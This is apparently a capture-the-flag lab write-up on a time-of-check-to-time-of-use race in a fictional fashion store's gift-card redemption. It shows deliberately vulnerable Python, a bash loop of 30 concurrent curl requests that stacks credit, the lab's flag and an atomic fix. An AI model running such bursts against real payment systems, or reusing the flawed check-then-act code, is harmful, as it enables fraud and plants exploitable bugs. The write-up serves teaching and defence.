# LOOM & CO — Race Condition in Gift-Card Redemption (TOCTOU)

| | |
|---|---|
| **Vulnerability** | Race condition (time-of-check to time-of-use) |
| **Impact** | Unlimited store credit → purchase of a restricted item |
| **Difficulty** | ★★★★ |
| **Approach** | Black-box |

## The application

LOOM & CO is a fashion storefront. New customers get a one-time `WELCOME100` gift card worth $100 of
store credit. The wallet starts at $120, and there's a limited-edition item — the Aurelia Wool Coat
at **$999** — well out of reach on a single $100 card.

```bash
docker compose up -d        # http://localhost:9004
```

## Discovery

The redemption endpoint checks whether the card was already used, waits briefly (simulating payment
processing), credits the account, and only *then* marks the card as used:

```python
if not state["giftcard_used"]:
    time.sleep(0.25)                 # processing window
    state["credit"] += 100.00
    state["giftcard_used"] = True    # marked used AFTER crediting
```

The check and the state update are not atomic. Between "is it used?" and "mark it used," there's a
window where many concurrent requests all pass the check before any of them sets the flag — so each
one credits another $100. Classic **TOCTOU**.

## Exploitation

A browser sends requests one at a time, so the race has to be driven concurrently — fire a burst of
redemptions in parallel:

```bash
for i in $(seq 1 30); do
  curl -s -X POST http://localhost:9004/api/redeem-giftcard \
    -H "Content-Type: application/json" -d '{"code":"WELCOME100"}' &
done; wait
```

~20+ of the 30 requests slip through the window, stacking credit well past $999. Then buy the
restricted coat; the flag arrives on the order receipt:

```
credit: 2420.00  →  checkout product 99 ($999)  →  gift_note:
FLAG{r4c3_c0nd1t10n_1n_th3_ch3ck0ut}
```

## Root-cause fix

Removing the `sleep` is **not** a fix — it only shrinks the window (and under a single-process GIL it
*looks* fixed while the non-atomic check-then-act remains, ready to fire under multiple workers or a
shared database). The fix is to make check-and-update **atomic**:

```python
with lock:                                   # serialize the critical section
    if not state["giftcard_used"]:
        state["giftcard_used"] = True
        state["credit"] += 100.00
```

In a real system the database enforces this: a single conditional write —
`UPDATE wallets SET used = 1 WHERE card = ? AND used = 0` — and acting only if exactly one row
changed, or a unique constraint on the redemption. The database guarantees only one redemption wins.

## Key lesson

Any "check, then act" on shared state is a race unless the two steps are atomic. Timing tweaks
(removing a delay) hide the bug; atomicity (a lock, a conditional DB write, a unique constraint)
eliminates it.
